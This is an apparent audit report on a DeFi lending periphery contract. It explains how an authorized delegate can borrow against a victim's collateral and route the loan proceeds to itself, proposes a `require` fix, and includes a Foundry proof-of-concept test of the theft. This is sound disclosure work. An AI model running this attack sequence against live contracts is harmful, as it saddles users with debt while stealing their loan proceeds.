### Title
Authorized caller can redirect all sell-side loan proceeds to an arbitrary address while debt accrues to the taker - (File: src/periphery/MidnightBundles.sol)

### Summary

`supplyCollateralAndSellWithUnitsTarget` accepts a caller-controlled `receiver` parameter with no constraint that it must equal `taker`. The authorization gate at line 127 only verifies the caller may act on the taker's behalf; it does not restrict where the resulting loan proceeds are sent. An attacker who holds `isAuthorized(victim, attacker) == true` can borrow against the victim's collateral and route 100% of the loan proceeds to themselves.

**Root cause:** The `receiver` parameter is never validated against `taker`. The `isAuthorized` gate grants the right to *initiate* actions on behalf of the taker; it does not grant the right to *redirect the taker's loan proceeds* to an arbitrary third party. The same flaw exists identically in `supplyCollateralAndSellWithAssetsTarget` at line 307. [9](#0-8) 

### Impact Explanation

The victim's debt increases by `targetUnits` and their collateral remains locked as backing. All loan proceeds (`filledSellerAssets`) are transferred to the attacker. This is unauthorized borrowing with complete redirection of loan proceeds — the victim is left with debt and no assets.

### Likelihood Explanation

**Preconditions:**
- Victim has authorized the bundler on Midnight (`isAuthorized[victim][bundler] == true`) — this is the normal operating precondition for any user of the bundler.
- Victim has authorized the attacker on Midnight (`isAuthorized[victim][attacker] == true`) — this is the additional precondition. Users may grant this to a portfolio manager contract, a keeper, or a trusted EOA for position management.
- Victim has sufficient pre-existing collateral in Midnight for the health check to pass.

All three conditions are realistic in normal protocol usage. The attack is repeatable as long as the authorization remains and collateral is present.

### Recommendation

Restrict `receiver` to `taker` whenever `msg.sender != taker`, or require an explicit separate authorization from the taker for the specific receiver address. The minimal fix:

```solidity
// In supplyCollateralAndSellWithUnitsTarget and supplyCollateralAndSellWithAssetsTarget:
require(receiver == taker || taker == msg.sender, Unauthorized());
```

This ensures that only the taker themselves (not a delegated caller) can designate a non-taker receiver for loan proceeds.

```solidity
function testAttackerRedirectsLoanProceeds() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Setup: victim has collateral in Midnight
    collateralize(market, victim, 100e18);

    // Victim authorizes bundler and attacker on Midnight
    vm.prank(victim);
    midnight.setIsAuthorized(address(midnightBundles), true, victim);
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Prepare a buy offer (lender side)
    offers[0].buy = true;
    offers[0].maxUnits = 100e18;
    Take[] memory takes = new Take[](1);
    takes[0] = Take({offer: offers[0], units: 100e18, ratifierData: hex""});

    uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);

    // Attacker calls with taker=victim, receiver=attacker
    vm.prank(attacker);
    midnightBundles.supplyCollateralAndSellWithUnitsTarget(
        100e18,
        0,
        victim,   // taker: victim bears the debt
        attacker, // receiver: attacker gets the loan proceeds
        new CollateralSupply[](0),
        takes,
        0,
        address(0)
    );

    // Assertions
    assertGt(midnight.debtOf(id, victim), 0, "victim has debt");
    assertGt(loanToken.balanceOf(attacker), attackerBalanceBefore, "attacker received loan proceeds");
    assertEq(loanToken.balanceOf(victim), 0, "victim received nothing");
}
```

Expected: victim's debt > 0, attacker's loan token balance increases, victim's loan token balance is 0.
